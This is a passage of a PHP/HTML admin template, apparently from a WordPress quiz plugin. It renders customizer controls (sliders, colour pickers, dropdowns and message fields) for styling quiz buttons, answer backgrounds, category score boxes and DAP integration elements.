												</div>
												
											</div>
										</div>
									</div>
								</div>
							
							</div>
							
						</div>
						<!--Customizer ends-->
					</div>
				</div>
			<!-- skip_question end --> 
                <!-- upload_file start -->
				<div class="col-sm-6">					
					<div class="quiz-card-outer-gray file_upload_wrapper restriction_settings">
						<h5 class="quiz--sub-title">File Upload Button  </h5>
						<div class="file_upload_temp_container file_upload_template_html_preview_outer">
							<?php
							
							 $fileUploadBtnHtml = sqbGetValidSettingsByKey('file_upload_btn_html');
							 $file_upload_customizer = sqbGetValidSettingsByKey('file_upload_customizer');
							
							
							$file_upload_btn_width =  128;
							$file_upload_btn_height =  13;
							$file_upload_backgroud_color =  '#4f6cbf';
							
							$file_upload_customizer = explode('||' , $file_upload_customizer);
							
							if(isset($file_upload_customizer[0]) && ($file_upload_customizer[0] != 'undefined')){
								$file_upload_btn_width = $file_upload_customizer[0];
							}
							
							if(isset($file_upload_customizer[1]) && ($file_upload_customizer[1] != 'undefined')){
								$file_upload_btn_height = $file_upload_customizer[1];
								
							}
							if(isset($file_upload_customizer[2]) && ($file_upload_customizer[2] != 'undefined')){
								$file_upload_backgroud_color = $file_upload_customizer[2];
								
							}
				
							
							
								//get quiz data
								if(isset($fileUploadBtnHtml) && $fileUploadBtnHtml != ''){
									echo  stripslashes($fileUploadBtnHtml); 
									}else{
							?>

							<div class="file_upload_button sqb_tiny_mce_editor" style=" display: inline-block; border-radius: 5px; background: #4f6cbf; color: #fff; height: auto; padding: 13px 15px;font-family: 'DM Sans',sans-serif;  min-width: 130px; box-shadow: none; margin: 0; text-decoration: none; line-height: normal; border: none; text-align: center;text-transform: initial;font-size: 14px;font-weight: 600;  width: 128px;  max-width: 100%; cursor: pointer;float: none;"><div>Upload</div></div>
						
							<?php } ?>
						</div>
							<!--Customizer Start-->
						<div class="Template-Customize-setting-outer  Template-Customize-horizontal-style">
							 <div class="Template-Customize-Setting element_customizer_wrapper_list btn_customizer">
								

								<div class="customizer_innner_sections">
									<div class="Template-Customize-element">
										<div class="Template-Customize-element-inner element_paddings">
											<div class="inner_template_style_box">
												<h4>Width</h4>
												<p>
													<input id="file_upload_btn_width" class="slider" data-slider-id='ex1Slider' type="text" data-slider-min="0" data-slider-max="900" data-slider-step="1" data-slider-value="<?php echo $file_upload_btn_width;?>" />
												</p>
											</div>
											
											<div class="inner_template_style_box ">
												<h4>Height</h4>
												<p>
													<input id="file_upload_btn_height" class="slider" data-slider-id='ex1Slider' type="text" data-slider-min="0" data-slider-max="200" data-slider-step="1" data-slider-value="<?php echo $file_upload_btn_height;?>" />
												</p>
											</div>
											
											<div class="inner_template_style_box ">
												<h4>Background </h4>
												<div id="file_upload_button_backgroud_color_div" class="input-append color input-group colorpicker-component colorpicker-element">
													<input type="text" value="<?php echo $file_upload_backgroud_color;?>" id="file_upload_button_backgroud_color">
													<span class="input-group-addon"><i style="background-color:<?php echo $file_upload_backgroud_color;?>;"></i></span>
												</div>
												
											</div>
										</div>
									</div>
								</div>
							
							</div>
							
						</div>
						<!--Customizer ends-->
					</div>
				</div>
				<!-- upload_file end -->   
				 
				<div class="col-sm-6">					
					<div class="quiz-card-outer-gray restriction_settings">
						<h5 class="quiz--sub-title">Answer Choice Background </h5>
						<?php 
						
							$answer_background = explode('||' , $answer_background);

						
						?>
						
						<!--div class="answer_container retake_template_html_preview_outer">
							
						</div-->
							<!--Customizer Start-->
						<div class="Template-Customize-setting-outer  Template-Customize-horizontal-style">
							 <div class="Template-Customize-Setting element_customizer_wrapper_list btn_customizer">
								<!-- <div class="showHideLeftSidebaroptions">
									<h3 class="Template-Customize_heading" >Customizer  
										<div class="customize_open_close" style="display:none">
											<i class="fa fa-angle-up customize_close" aria-hidden="true" style="display:none"></i>
											<i class="fa fa-angle-down customize_open" aria-hidden="true" ></i>
										</div>
									</h3> 
								</div> -->
								

								<div class="customizer_innner_sections">
									 <div class="Template-Customize-element">
									   
										<div class="Template-Customize-element-inner element_paddings">
								  
											<div class="inner_template_style_box ">
												<h4>Default Background </h4>
												<div id="answer_background_color_div1" class="input-append color input-group colorpicker-component colorpicker-element">
													<input type="text" value="<?= isset($answer_background[2]) ? $answer_background[2] : '#e5f1ff' ?>" id="answer_background_color1">
													<span class="input-group-addon"><i style="background-color:<?= isset($answer_background[2]) ? $answer_background[2] : '#e5f1ff' ?>;"></i></span>
												</div>
												
											</div>
											<div class="inner_template_style_box ">
												<h4>Hover Background </h4>
												<div id="answer_background_color_div" class="input-append color input-group colorpicker-component colorpicker-element">
													<input type="text" value="<?= isset($answer_background[0]) ? $answer_background[0] : '#4f6cbf' ?>" id="answer_background_color">
													<span class="input-group-addon"><i style="background-color:<?= isset($answer_background[0]) ? $answer_background[0] : '#4f6cbf' ?>;"></i></span>
												</div>
												
											</div>

											<div class="inner_template_style_box ">
												<h4>Hover Text </h4>
												<div id="answer_text_color_div" class="input-append color input-group colorpicker-component colorpicker-element">
													<input type="text" value="<?= isset($answer_background[1]) ? $answer_background[1] : '#fff' ?>" id="answer_text_color">
													<span class="input-group-addon"><i style="background-color:<?= isset($answer_background[1]) ? $answer_background[1] : '#fff' ?>;"></i></span>
												</div>
												
											</div>
											
											
										</div>	
									</div>
								</div>
							
							</div>
							
						</div>
						<!--Customizer ends-->
					</div>
				</div>
			
			
			<div class="col-sm-6">
				<div class="quiz-card-outer-gray restriction_settings">
					<h5 class="quiz--sub-title">Correct/Incorrect Answer Background </h5>
					 
					<div class="results_correct_incorret_container  ">
						  
					</div>
						<!--Customizer Start-->
					<div class="Template-Customize-setting-outer  Template-Customize-horizontal-style">
						 <div class="Template-Customize-Setting element_customizer_wrapper_list btn_customizer">
							 

							<div class="customizer_innner_sections">
								 <div class="Template-Customize-element">
								   
									<div class="Template-Customize-element-inner element_paddings">
							  
										<div class="inner_template_style_box ">
											<h4>Correct Answer Background </h4>
											<div id="result_background_color_div" class="input-append color input-group colorpicker-component colorpicker-element">
												<input type="text" value="<?= isset($answer_background[3]) ? $answer_background[3] : '#00bcd4' ?>" id="result_background_color">
												<span class="input-group-addon"><i style="background-color:<?= isset($answer_background[3]) ? $answer_background[3] : '#00bcd4' ?>;"></i></span>
											</div>
											
										</div>
										
										<div class="inner_template_style_box ">
											<h4>Incorrect Answer Background </h4>
											<div id="result_background_color_div1" class="input-append color input-group colorpicker-component colorpicker-element">
												<input type="text" value="<?= isset($answer_background[4]) ? $answer_background[4] : '#ff5757' ?>" id="result_background_color1">
												<span class="input-group-addon"><i style="background-color: <?= isset($answer_background[4]) ? $answer_background[4] : '#ff5757' ?>;"></i></span>
											</div>
											
										</div>
									</div>	
								</div>
							</div>
						
						</div>
						
					</div>
					<!--Customizer ends-->
				</div>
			</div>
			<div class="col-sm-6" style="display:none;">
					<div class="quiz-card-outer-gray restriction_settings">
						<h5 class="quiz--sub-title">Back Button  </h5>
						<div class="back_temp_container back_template_html_preview_outer">
							<?php
								if(isset($backBtnHtml) && $backBtnHtml != ''){
										echo stripslashes($backBtnHtml); 
										 
								} else { 
							?>	
							<div class="single_back_btn sqb_back_btn sqb_tiny_mce_editor" style="display: inline-block;border-radius: 5px;background: #000000;color: #ffffff;height: auto;padding: 12px 15px;font-family: 'DM Sans', sans-serif;min-width: 90px;box-shadow: none;margin: 0px;text-decoration: none;line-height: normal;border: none;text-align: center;text-transform: initial;font-size: 16px;font-weight: 600;width: 100px;max-width: 100%;cursor: pointer;float: none;position: relative;"><div>Back</div></div>
							
							<?php  }  ?>
						</div>
							<!--Customizer Start-->
						<div class="Template-Customize-setting-outer Template-Customize-horizontal-style">
							 <div class="Template-Customize-Setting element_customizer_wrapper_list btn_customizer">
								<!-- <div class="showHideLeftSidebaroptions">
									<h3 class="Template-Customize_heading" >Customizer  
										<div class="customize_open_close" style="display: none;">   
											<i class="fa fa-angle-up customize_close" aria-hidden="true" style="display:none"></i>
											<i class="fa fa-angle-down customize_open" aria-hidden="true" ></i>
										</div>
									</h3> 
								</div> -->

								<div class="customizer_innner_sections">
									<div class="Template-Customize-element">
										<div class="Template-Customize-element-inner element_paddings">
											<div class="inner_template_style_box">
												<h4>Width</h4>
												<p>
													<input id="backbtn_width" class="slider" data-slider-id='ex1Slider' type="text" data-slider-min="0" data-slider-max="900" data-slider-step="1" data-slider-value="100" />
												</p>
											</div>
											
											<div class="inner_template_style_box ">
												<h4>Height</h4>
												<p>
													<input id="backbtn_height" class="slider" data-slider-id='ex1Slider' type="text" data-slider-min="0" data-slider-max="200" data-slider-step="1" data-slider-value="12" />
												</p>
											</div>
											
											<div class="inner_template_style_box ">
												<h4>Background </h4>
												<div id="backbutton_backgroud_color_div" class="input-append color input-group colorpicker-component colorpicker-element">
													<input type="text" value="#252525" id="backbutton_backgroud_color">
													<span class="input-group-addon"><i style="background-color: #252525;"></i></span>
												</div>
											</div>
										</div>
									</div>
								</div>
							
							</div>
							
						</div>
						<!--Customizer ends-->
					</div>
				</div>
				<div class="col-sm-6">
					<div class="quiz-card-outer-gray restriction_settings">
						<h5 class="quiz--sub-title">Download Certificate  </h5>
						<div class="download_certificate_temp_container download_certificate_template_html_preview_outer">
							<?php
								if(isset($downloadCertificateHtml) && $downloadCertificateHtml != ''){
										echo stripslashes($downloadCertificateHtml); 
										 
								} else { 
							?>	
							<div class="sqb_download_certificate_btn download-certificate-pdf sqb_tiny_mce_editor"  data-quiz-id="%%QUIZ_ID%%" data-lead-id="%%LEAD_ID%%" style="display: inline-block;border-radius: 5px;background: #f29341;color: #ffffff;height: auto;padding: 12px 15px;font-family: 'DM Sans', sans-serif;min-width: 210px;box-shadow: none;margin: 0px;text-decoration: none;line-height: normal;border: none;text-align: center;text-transform: initial;font-size: 16px;font-weight: 600;width: 100px;max-width: 100%;cursor: pointer;float: none;position: relative;"><div>Download Certificate</div></div>
							
							<?php  }  ?>
						</div>
							<!--Customizer Start-->
						<div class="Template-Customize-setting-outer Template-Customize-horizontal-style">
							 <div class="Template-Customize-Setting element_customizer_wrapper_list btn_customizer">
								<!-- <div class="showHideLeftSidebaroptions">
									<h3 class="Template-Customize_heading" >Customizer  
										<div class="customize_open_close" style="display: none;">   
											<i class="fa fa-angle-up customize_close" aria-hidden="true" style="display:none"></i>
											<i class="fa fa-angle-down customize_open" aria-hidden="true" ></i>
										</div>
									</h3> 
								</div> -->

								<div class="customizer_innner_sections">
									<div class="Template-Customize-element">
										<div class="Template-Customize-element-inner element_paddings">
											<div class="inner_template_style_box">
												<h4>Width</h4>
												<p>
													<input id="download_certificate_btn_width" class="slider" data-slider-id='ex1Slider' type="text" data-slider-min="0" data-slider-max="900" data-slider-step="1" data-slider-value="210" />
												</p>
											</div>
											
											<div class="inner_template_style_box ">
												<h4>Height</h4>
												<p>
													<input id="download_certificate_btn_height" class="slider" data-slider-id='ex1Slider' type="text" data-slider-min="0" data-slider-max="200" data-slider-step="1" data-slider-value="12" />
												</p>
											</div>
											
											<div class="inner_template_style_box ">
												<h4>Background </h4>
												<div id="download_certificate_backgroud_color_div" class="input-append color input-group colorpicker-component colorpicker-element">
													<input type="text" value="#252525" id="download_certificate_backgroud_color">
													<span class="input-group-addon"><i style="background-color: #252525;"></i></span>
												</div>
											</div>
										</div>
									</div>
								</div>
							
							</div>
							
						</div>
						<!--Customizer ends-->
					</div>
				</div>
			</div>


		</div>

		<?php  $category_customizer_values = sqbGetValidSettingsByKey('category_customizer_values'); 

				if($category_customizer_values){
					$category_customizer_values = explode('|', $category_customizer_values);
					$width = $category_customizer_values[0];
					$background_color = $category_customizer_values[1];
					$border_width = $category_customizer_values[2];
					$borer_style = $category_customizer_values[3];
					$border_color = $category_customizer_values[4];
					$spread_radius = $category_customizer_values[5];
					$blur_radius = $category_customizer_values[6];
					$horizontal_length = $category_customizer_values[7];
					$vertical_length = $category_customizer_values[8];
					$boxshadow_color = $category_customizer_values[9];
					$customizer_align_style = $category_customizer_values[10];
					$cust_margin = $category_customizer_values[11];
					$cust_padding = $category_customizer_values[12];
				}else{
					$width = '375';
					$background_color = '#f3f3ff';
					$border_width = '3';
					$borer_style = 'dotted';
					$border_color = '#0c0000';
					$spread_radius = '0';
					$blur_radius = '0';
					$horizontal_length = '0';
					$vertical_length = '0';
					$boxshadow_color = '#ffffff';
					$customizer_align_style = 'left';
					$cust_margin = '10';
					$cust_padding = '10';
				}

				$style = 'max-width:'.$width.'px;background-color:'.$background_color.';border-width:'.$border_width.'px;border-style:'.$borer_style.';border-color:'.$border_color.';box-shadow:'.$boxshadow_color.' '.$horizontal_length.'px '.$vertical_length.'px '.$blur_radius.'px '.$spread_radius.'px;float:'.$customizer_align_style.';margin-bottom:'.$cust_margin.'px;padding:'.$cust_padding.'px;';

		?>

		<div class="tab-pane fade" id="customizer_category_setting_tab" role="tabpanel" aria-labelledby="customizer_category_setting_tab">
			<h5 class="quiz--sub-title">Category Customizer</h5>
			<h3 class="customizer-preview">Preview</h3>	
			<div class="row mt-4 mb-4">
				<div class="col-sm-12 text-center">	
								
					<div class="CategoryCustomizer_result" style="<?php echo $style; ?>">
						<div class="d-flex total-score">
							<h4>Total Score: </h4>
							<p class="m-0 ml-auto"> 6/10</p>
						</div>

						<div class="d-flex">
							<h4>Math :</h4>
							<p class="m-0 ml-auto">100% (5/5)</p>
						</div>
						<div class="d-flex">
							<h4>English :</h4>
							<p class="m-0 ml-auto">0% (0/3)</p>
						</div>
						<div class="d-flex">
							<h4>Science :</h4>
							<p class="m-0 ml-auto">50% (1/2)</p>
						</div>
					</div>
				</div>
			</div>

			<div class="row mt-4">
				<div class="col-sm-12">					
					<div class="quiz-card-outer-gray restriction_settings mb-0">
						<div class="Template-Customize-setting-outer Template-Customize-horizontal-style">
							<div class="Template-Customize-Setting">
								<div class="customizer_innner_sections">
									<div class="Template-Customize-element">
										<div class="Template-Customize-element-inner element_paddings">
											<div class="inner_template_style_box">
												<h4>Width</h4>
												<input id="customizer_width" class="slider" data-slider-id="ex1Slider" type="text" data-slider-min="100" data-slider-max="1400" data-slider-step="1" data-slider-value="<?php echo $width; ?>">
											</div>
											<div class="inner_template_style_box ">
												<h4>Background Color</h4>
												<div id="category_customizer_background" class="input-append color input-group colorpicker-component colorpicker-element">
													<input type="text" value="<?php echo $background_color; ?>" id="category_customizer_background_color" class="colorpicker-element">
													<span class="input-group-addon"><i style="background-color:<?php echo $background_color; ?>;"></i></span>
												</div>
												
											</div>
											<div class="inner_template_style_box ">
												<h4>Border-Width </h4>
												
												<input id="customizer_border_width" class="slider" data-slider-id="ex1Slider" type="text" data-slider-min="0" data-slider-max="20" data-slider-step="1" data-slider-value="<?php echo $border_width ?>">
											</div>

											<div class="inner_template_style_box">
												<h4>Border-Style</h4>
												<p>
													<select id="customizer_temp_br_style">
														<option value="solid" <?php if($borer_style == 'solid'){echo 'selected="selected"';} ?>>Solid</option>
														<option value="dashed" <?php if($borer_style == 'dashed'){echo 'selected="selected"';} ?>>Dashed</option>
														<option value="dotted" <?php if($borer_style == 'dotted'){echo 'selected="selected"';} ?>>Dotted</option>
													</select>
												</p>
											</div>
											<div class="inner_template_style_box ">
												<h4>Border Color</h4>
												<div id="category_customizer_border" class="input-append color input-group colorpicker-component colorpicker-element">
													<input type="text" value="#4f6cbf" id="category_customizer_border_color" class="colorpicker-element">
													<span class="input-group-addon"><i style="background-color:<?php echo $border_color; ?>;"></i></span>
												</div>
											</div>
										</div>
									</div>
								</div>
							</div>
						</div>
						
					</div>
				</div>
			</div>

			<div class="row mt-4">
				<div class="col-sm-12">					
					<div class="quiz-card-outer-gray restriction_settings mb-4">
						<div class="Template-Customize-setting-outer Template-Customize-horizontal-style">
							<div class="Template-Customize-Setting">
								<div class="customizer_innner_sections">
									<div class="Template-Customize-element">
										<div class="Template-Customize-element-inner element_paddings">
											<div class="inner_template_style_box">
												<h4>Spread radius</h4>
												<input id="customizer_spread_radius" class="slider" data-slider-id="ex1Slider" type="text" data-slider-min="0" data-slider-max="20" data-slider-step="1" data-slider-value="<?php echo $spread_radius; ?>">
											</div>

											<div class="inner_template_style_box">
												<h4>Blur Radius</h4>
												<input id="customizer_blur_radius" class="slider" data-slider-id="ex1Slider" type="text" data-slider-min="0" data-slider-max="20" data-slider-step="1" data-slider-value="<?php echo $blur_radius; ?>">
											</div>
											<div class="inner_template_style_box">
												<h4>Horizontal Length</h4>
												<input id="customizer_horizontal_length" class="slider" data-slider-id="ex1Slider" type="text" data-slider-min="0" data-slider-max="20" data-slider-step="1" data-slider-value="<?php echo $horizontal_length; ?>">
											</div>
											<div class="inner_template_style_box">
												<h4>Vertical Length</h4>
												<input id="customizer_vertical_length" class="slider" data-slider-id="ex1Slider" type="text" data-slider-min="0" data-slider-max="20" data-slider-step="1" data-slider-value="<?php echo $vertical_length; ?>">
											</div>
											<div class="inner_template_style_box ">
												<h4>Box Shadow Color </h4>
												<div id="category_customizer_border_box_div" class="input-append color input-group colorpicker-component colorpicker-element">
													<input type="text" value="#<?php echo $boxshadow_color; ?>" id="category_customizer_box_background_color" class="colorpicker-element">
													<span class="input-group-addon"><i style="background-color:<?php echo $boxshadow_color; ?>;"></i></span>
												</div>
											</div>
											
										</div>
									</div>
								</div>
							</div>
						</div>
					</div>
				</div>
			</div>
			<div class="row mt-4">
				<div class="col-sm-12">					
					<div class="quiz-card-outer-gray restriction_settings mb-4">
						<div class="Template-Customize-setting-outer Template-Customize-horizontal-style">
							<div class="Template-Customize-Setting">
								<div class="customizer_innner_sections">
									<div class="Template-Customize-element">
										<div class="Template-Customize-element-inner element_paddings">
											<div class="inner_template_style_box">
												<h4>Alignment</h4>
												<p>
													<select id="customizer_align_style">
														<option value="left" <?php if($customizer_align_style == 'left'){echo 'selected="selected"';} ?>>Left</option>
														<option value="none" <?php if($customizer_align_style == 'none'){echo 'selected="selected"';} ?>>Center</option>
														<option value="right" <?php if($customizer_align_style == 'right'){echo 'selected="selected"';} ?>>Right</option>
													</select>
												</p>
											</div>
											<div class="inner_template_style_box">
												<h4>Margin</h4>
												<input id="customizer_margin" class="slider" data-slider-id="ex1Slider" type="text" data-slider-min="0" data-slider-max="100" data-slider-step="1" data-slider-value="<?php echo $cust_margin; ?>">
											</div>
											<div class="inner_template_style_box">
												<h4>Padding</h4>
												<input id="customizer_padding" class="slider" data-slider-id="ex1Slider" type="text" data-slider-min="0" data-slider-max="100" data-slider-step="1" data-slider-value="<?php echo $cust_padding; ?>">
											</div>
										</div>
									</div>
								</div>
							</div>
						</div>
					</div>
				</div>
			</div>			
		</div>
		<?php 
		if(sqb_check_dap_exists() && function_exists('dap_livelinks_activate')  ){ ?>
		<div class="tab-pane fade " id="dap_setting_tab" role="tabpanel" aria-labelledby="dap_setting_tab">	
			
			<?php 
				$dap_see_details_btn_html = sqbGetValidSettingsByKey('dap_see_details_btn_html');
				$dap_see_details_btn_customizer = sqbGetValidSettingsByKey('dap_see_details_btn_customizer');
				$dap_questions_customizer = sqbGetValidSettingsByKey('dap_questions_customizer');
				$dap_answer_customizer = sqbGetValidSettingsByKey('dap_answer_customizer');
				
				$dap_see_details_btn_width =  140;
				$dap_see_details_btn_height =  12;
				$see_details_backgroud_color =  '#252525';
				
				$dap_see_details_btn_customizer = explode('||' , $dap_see_details_btn_customizer);
				
				if(isset($dap_see_details_btn_customizer[0]) && ($dap_see_details_btn_customizer[0] != 'undefined')){
					$dap_see_details_btn_width = $dap_see_details_btn_customizer[0];
				}
				
				if(isset($dap_see_details_btn_customizer[1]) && ($dap_see_details_btn_customizer[1] != 'undefined')){
					$dap_see_details_btn_height = $dap_see_details_btn_customizer[1];
					
				}
				
				if(isset($dap_see_details_btn_customizer[2]) && ($dap_see_details_btn_customizer[2] != 'undefined')){
					$see_details_backgroud_color = $dap_see_details_btn_customizer[2];
				}
				
			
			?>
			
			<div class="row mt-4">
				<div class="col-sm-6">					
					<div class="quiz-card-outer-gray restriction_settings">
						
						
						
						<h5 class="quiz--sub-title">See Details Button  </h5>
						<div class="dap_see_details_template_html_preview_outer">
							<?php
								//get quiz data
								if(isset($dap_see_details_btn_html) && $dap_see_details_btn_html != ''){
									echo  stripslashes($dap_see_details_btn_html); 
									}else{
							?>

							<div class="dap_see_details_btn sqb_tiny_mce_editor" style=" display: inline-block; border-radius: 5px; background: #252525; color: #fff; height: auto; padding: 12px 15px;font-family: 'DM Sans',sans-serif;  min-width: 90px; box-shadow: none; margin: 0; text-decoration: none; line-height: normal; border: none; text-align: center;text-transform: initial;font-size: 16px;font-weight: 600;  width: 140px;  max-width: 100%; cursor: pointer;float: none;"><div>See Results</div></div>
						
							<?php } ?>
						</div>
							<!--Customizer Start-->
						<div class="Template-Customize-setting-outer  Template-Customize-horizontal-style">
							 <div class="Template-Customize-Setting element_customizer_wrapper_list btn_customizer">
								

								<div class="customizer_innner_sections">
									<div class="Template-Customize-element">
										<div class="Template-Customize-element-inner element_paddings">
											<div class="inner_template_style_box">
												<h4>Width</h4>
												<p>
													<input id="see_details_width" class="slider" data-slider-id='ex1Slider' type="text" data-slider-min="0" data-slider-max="900" data-slider-step="1" data-slider-value="<?php echo $dap_see_details_btn_width;?>" />
												</p>
											</div>
											
											<div class="inner_template_style_box ">
												<h4>Height</h4>
												<p>
													<input id="see_details_height" class="slider" data-slider-id='ex1Slider' type="text" data-slider-min="0" data-slider-max="200" data-slider-step="1" data-slider-value="<?php echo $dap_see_details_btn_height;?>" />
												</p>
											</div>
											
											<div class="inner_template_style_box ">
												<h4>Background </h4>
												<div id="see_details_backgroud_color_div" class="input-append color input-group colorpicker-component colorpicker-element">
													<input type="text" value="<?php echo $see_details_backgroud_color;?>" id="see_details_backgroud_color">
													<span class="input-group-addon"><i style="background-color: <?php echo $see_details_backgroud_color;?>"></i></span>
												</div>
												
											</div>
										</div>
									</div>
								</div>
							
							</div>
							
						</div>
						<!--Customizer ends-->
					</div>
				</div> <!-- claosed col-sm-6 -->
				<div class="col-sm-6">					
					<div class="quiz-card-outer-gray restriction_settings">
						<h5 class="quiz--sub-title">Question Style </h5>
						<?php 
						
							$dap_questions_customizer = explode('||' , $dap_questions_customizer);
                            $dap_questions_font = 17;
                            
                            if(isset($dap_questions_customizer[0]) && ($dap_questions_customizer[0] != 'undefined') ){
								$dap_questions_font = $dap_questions_customizer[0];
							} 
						
						?>
						
						<div class="answer_container retake_template_html_preview_outer">
							
						</div>
							<!--Customizer Start-->
						<div class="Template-Customize-setting-outer  Template-Customize-horizontal-style">
							 <div class="Template-Customize-Setting element_customizer_wrapper_list btn_customizer">
								
								

								<div class="customizer_innner_sections">
									 <div class="Template-Customize-element">
									   
										<div class="Template-Customize-element-inner element_paddings">
												<div class="inner_template_style_box">
													<h4>Font Size</h4>
													<p>
														<input id="dap_questions_font" class="slider" data-slider-id='ex1Slider' type="text" data-slider-min="0" data-slider-max="50" data-slider-step="1" data-slider-value="<?php echo $dap_questions_font;?>" />
													</p>
												</div>
											
											
										</div>	
									</div>
								</div>
							
							</div>
							
						</div>
						<!--Customizer ends-->
					</div>
				</div>
				</div> <!-- claosed row -->
				<div class="row mt-4">
				
					<div class="col-sm-6">					
						<div class="quiz-card-outer-gray restriction_settings">
							<h5 class="quiz--sub-title">Answer Style </h5>
							<?php 
							
								$dap_answer_customizer = explode('||' , $dap_answer_customizer);
                                
                                
                                $dap_answer_font = '14';
                                $dap_answer_font_weight = '500';
                                $dap_answer_background_color = '#f7f7f7';
                                $dap_answer_active_background_color = '#4f6cbf';
                                
								
								if(isset($dap_answer_customizer[0]) && ($dap_answer_customizer[0] != 'undefined')){
									$dap_answer_font = $dap_answer_customizer[0];
								}
								if(isset($dap_answer_customizer[1]) && ($dap_answer_customizer[1] != 'undefined')){
									$dap_answer_font_weight = $dap_answer_customizer[1];
								}
								if(isset($dap_answer_customizer[2]) && ($dap_answer_customizer[2] != 'undefined')){
									$dap_answer_background_color = $dap_answer_customizer[2];
								}
								if(isset($dap_answer_customizer[3]) && ($dap_answer_customizer[3] != 'undefined') ){
									$dap_answer_active_background_color = $dap_answer_customizer[3];
								}
                                
                                
                                
                                
							
							?>
							
							<div class="answer_container retake_template_html_preview_outer">
								
							</div>
								<!--Customizer Start-->
							<div class="Template-Customize-setting-outer  Template-Customize-horizontal-style">
								 <div class="Template-Customize-Setting element_customizer_wrapper_list btn_customizer">
								

								<div class="customizer_innner_sections">
									 <div class="Template-Customize-element">
									   
										<div class="Template-Customize-element-inner element_paddings">
								           
								           
								           
								           <div class="inner_template_style_box">
													<h4>Font Size</h4>
													<p>
														<input id="dap_answer_font" class="slider" data-slider-id='ex1Slider' type="text" data-slider-min="0" data-slider-max="50" data-slider-step="1" data-slider-value="<?php echo $dap_answer_font;?>" />
													</p>
											</div>
											
											<div class="inner_template_style_box">
													<h4>Font Weight</h4>
													<p>
														<select name="dap_answer_font_weight" id="dap_answer_font_weight">
														<option value="100" <?php if($dap_answer_font_weight == 100){ echo "selected='selected'";}?>>100</option>
														<option value="200" <?php if($dap_answer_font_weight == 200){ echo "selected='selected'";}?>>200</option>
														<option value="300" <?php if($dap_answer_font_weight == 300){ echo "selected='selected'";}?>>300</option>
														<option value="400" <?php if($dap_answer_font_weight == 400){ echo "selected='selected'";}?>>400</option>
														<option value="500" <?php if($dap_answer_font_weight == 500){ echo "selected='selected'";}?>>500</option>
														<option value="600"<?php if($dap_answer_font_weight == 600){ echo "selected='selected'";}?>>600</option>
														<option value="700" <?php if($dap_answer_font_weight == 700){ echo "selected='selected'";}?>>700</option>
														<option value="800" <?php if($dap_answer_font_weight == 800){ echo "selected='selected'";}?>>800</option>
														<option value="900" <?php if($dap_answer_font_weight == 900){ echo "selected='selected'";}?>>900</option>
														</select>
													</p>
											</div>
												
											<div class="inner_template_style_box ">
												<h4>Default Background </h4>
												<div id="dap_answer_background_color_div" class="input-append color input-group colorpicker-component colorpicker-element">
													<input type="text" value="<?= $dap_answer_background_color; ?>" id="dap_answer_background_color">
													<span class="input-group-addon"><i style="background-color:<?= $dap_answer_background_color; ?>"></i></span>
												</div>
												
											</div>
											
										</div>
										<div class="Template-Customize-element-inner element_paddings">	
											
											<div class="inner_template_style_box ">
												<h4>Default Active Background </h4>
												<div id="dap_answer_active_background_color_div" class="input-append color input-group colorpicker-component colorpicker-element">
													<input type="text" value="<?= $dap_answer_active_background_color; ?>" id="dap_answer_active_background_color">
													<span class="input-group-addon"><i style="background-color:<?= $dap_answer_active_background_color; ?>;"></i></span>
												</div>
												
											</div>

											
											
										</div>	
									</div>
								</div>
							
							</div>
							
						</div>
						<!--Customizer ends-->
					</div>
				</div>
				</div> <!-- claosed row -->
				
				
				
			
		</div>	
		
		<?php } ?>
		
		<div class="tab-pane fade" id="message_setting_tab" role="tabpanel" aria-labelledby="message_setting_tab">
			<h5 class="quiz--sub-title">Message Customizer</h5>
			<div class="quiz-card-outer-gray msg_setting-content-card">
				<div class="fb-tracking-content-card">
					<label for="" class="fb-tracking_label">Correct Answer </label>
					<div class="fb-tracking_right-content">
						<input type="text" class="form-control" value="<?= isset($correct_answer_msg) ? $correct_answer_msg: 'This is the correct answer' ?>" id="correct_answer_msg">
					</div>
				</div>	
				<div class="fb-tracking-content-card">
					<label for="" class="fb-tracking_label">Incorrect Answer  </label>
					<div class="fb-tracking_right-content">
						<input type="text" class="form-control" value="<?= isset($incorrect_answer_msg) ? $incorrect_answer_msg: 'This answer is incorrect' ?>" id="incorrect_answer_msg">
					</div>
				</div>	
				<div class="fb-tracking-content-card">
					<label for="" class="fb-tracking_label">Pick an answer </label>
					<div class="fb-tracking_right-content">
						<input type="text" class="form-control" value="<?= isset($pick_ans_msg) ? $pick_ans_msg: 'Please pick an answer.' ?>" id="pick_ans_msg">
					</div>
				</div>
				<div class="fb-tracking-content-card">
					<label for="" class="fb-tracking_label">Question </label>
					<div class="fb-tracking_right-content">
						<input type="text" class="form-control" value="<?= isset($sqb_question_cust) ? $sqb_question_cust: 'Question' ?>" id="sqb_question_cust">
					</div>
				</div>
				<div class="fb-tracking-content-card">
					<label for="" class="fb-tracking_label">Answer </label>
					<div class="fb-tracking_right-content">
						<input type="text" class="form-control" value="<?= isset($sqb_answer_cust) ? $sqb_answer_cust: 'Answer' ?>" id="sqb_answer_cust">
					</div>
				</div>
				<div class="fb-tracking-content-card">
					<label for="" class="fb-tracking_label">Incorrect Answer Explanation </label>
					<div class="fb-tracking_right-content">
						<input type="text" class="form-control" value="<?= isset($sqb_incorrect_ans_exp) ? $sqb_incorrect_ans_exp: 'Incorrect Answer Explanation' ?>" id="sqb_incorrect_ans_exp">
					</div>
				</div>
				
				<div class="fb-tracking-content-card">
					<label for="" class="fb-tracking_label">Name</label>
					<div class="fb-tracking_right-content">
						<input type="text" class="form-control" value="<?= isset($username_empty_msg) ? $username_empty_msg: 'Name is a required field ' ?>" id="username_empty_msg">
					</div>
				</div>	
				<div class="fb-tracking-content-card">
					<label for="" class="fb-tracking_label">Email </label>
					<div class="fb-tracking_right-content">
						<input type="text" class="form-control" value="<?= isset($email_empty_msg) ? $email_empty_msg: 'Email is a required field' ?>" id="email_empty_msg">
					</div>
				</div>	
				<div class="fb-tracking-content-card">
					<label for="" class="fb-tracking_label">Terms and Condition</label>
					<div class="fb-tracking_right-content">
						<input type="text" class="form-control" value="<?= isset($terms_condition_msg) ? $terms_condition_msg: 'Please accept the terms to proceed' ?>" id="terms_condition_msg">
					</div>
				</div>
				<div class="fb-tracking-content-card">
					<label for="" class="fb-tracking_label">FB Share Message </label>
					<div class="fb-tracking_right-content">
						<input type="text" class="form-control" value="<?= isset($fb_share_thank_you_msg) ? $fb_share_thank_you_msg: 'Thanks for sharing!' ?>" id="fb_share_thank_you_msg">
					</div>
				</div>
				
				<div class="fb-tracking-content-card">
					<label for="" class="fb-tracking_label">FB Share Error Message </label>
					<div class="fb-tracking_right-content">
